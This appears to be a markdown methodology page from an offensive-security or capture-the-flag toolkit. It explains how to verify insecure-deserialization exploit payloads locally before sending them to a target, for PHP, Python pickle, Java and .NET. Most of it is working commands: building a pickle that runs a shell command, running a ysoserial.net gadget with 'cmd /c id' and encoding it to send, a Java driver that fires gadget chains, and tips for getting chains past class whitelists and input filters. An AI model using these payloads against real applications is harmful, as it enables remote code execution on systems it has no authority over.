# Testing Lab — exercising gadgets locally before the target

## The rule — a gadget that can't run locally never lands

Every generator has a local-test mode — a gadget that errors on YOUR box
will never reach the remote. Test the whole payload locally first: generate,
parse, deserialize in a controlled way, read what it builds.

## The repo-tool selftest — proof the tool works

```bash
python3 tools/pickle_gen.py --selftest
python3 tools/pickle_dis.py --selftest
python3 tools/php_ser_parse.py --selftest
python3 tools/php_ser_gen.py --selftest
python3 tools/java_ser.py --selftest
python3 tools/web/archive_gen.py --selftest
python3 tools/msgpack_read.py --selftest
```

The gate runs these — a selftest pass means the tool's contract holds on
THIS box.

## PHP — the local verify loop

```bash
# 1. build
python3 tools/php_ser_gen.py --spec '{"O":"User","props":{"x":"admin"}}' >p.ser
# 2. parse it back — the graph should match
python3 tools/php_ser_parse.py p.ser
# 3. unserialize it locally — does PHP take it?
php -r 'var_dump(unserialize(file_get_contents("p.ser")));'
#    → the object's class/props — a parse error means the bytes are wrong
```

The `php -r` round-trip is the real test — `unserialize` on YOUR bytes
tells you the grammar is valid before the target sees it.

## Python — the disassembly loop

```bash
# build + disassemble — never loads() the result blindly
python3 tools/pickle_gen.py --cmd 'id' >p.pkl
python3 tools/pickle_dis.py p.pkl --full      # the opcodes it would run
# verdict must say 'code-execution opcodes present' — if 'data-only'
# your REDUCE didn't land
```

A controlled local `pickle.loads` on YOUR generated payload is safe — you
know what it contains. The rule is: never `loads` a blob you didn't write.

## Java — the ysoserial local test

```bash
# ysoserial has no -t flag — run the gadget through a local deserializer:
java -cp .:/path/to/lib.jar DeserTest    # a tiny class that readObjects stdin

# or — the generated blob should parse as a stream:
python3 tools/java_ser.py payload.ser    # walks TC_* — a parse error = bad stream
# the stream's classdesc list should name the gadget classes
```

```bash
# a minimal local readObject driver:
cat > D.java <<'EOF'
import java.io.*;
public class D {
  public static void main(String[] a) throws Exception {
    ObjectInputStream o = new ObjectInputStream(new FileInputStream(a[0]));
    try { o.readObject(); } catch (Throwable t) { t.printStackTrace(); }
  }
}
EOF
javac D.java && java -cp .:<lib.jar> D payload.ser
# the gadget fires locally → it'll fire remotely
```

## .NET — ysoserial.net `-t`

```bash
# -t runs the gadget through the formatter locally — the real test
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c id' -t
# a local exec = the gadget+formatter pair works — then -o base64 to send
```

## The deserializer-side mock — build the app's exact call

The *sink call shape* matters — `unserialize` vs `unserialize($x,['allowed_classes'=>[]])`
vs `readObject` vs `readUnshared`. Write the app's exact call locally:

```php
// mock the app's sink:
php -r '$x=file_get_contents("p.ser"); unserialize($x,["allowed_classes"=>["Logger","FileHandler"]]);'
// → does YOUR chain fire under THIS whitelist? only then send
```

```java
// mock the app's filter:
ois.setObjectInputFilter(info -> info.serialClass().getName().startsWith("com.app") ? Status.ALLOWED : Status.REJECTED);
ois.readObject();
```

## The "works locally, fails remotely" matrix

| Cause | Symptom |
|---|---|
| version mismatch | `InvalidClassException`/`serialVersionUID`/`ClassNotFound` |
| `allowed_classes`/`Binder`/`find_class` on target, not local | `REJECTED`/`Incomplete_Class` |
| a signature/MAC on the remote path | "invalid signature"/`ViewStateException` |
| mangle on the transport | grammar error at a different offset |
| the remote skips a method call the local ran | silent 200 — the trigger isn't reached |

## The fixture-sink — write the whole app locally

The strongest local test is running the app's real sink — if the handout
ships source, stand the app up in a container and hit it. `docker compose`
the handout, feed it your blob, read the logs — the local app IS the
oracle.

## Output to record

- The local-verify step that ran (the `php -r`/`D.java`/`-t`/`--selftest`)
- Whether the gadget fired locally and what changed for the remote
- The verbatim remote response
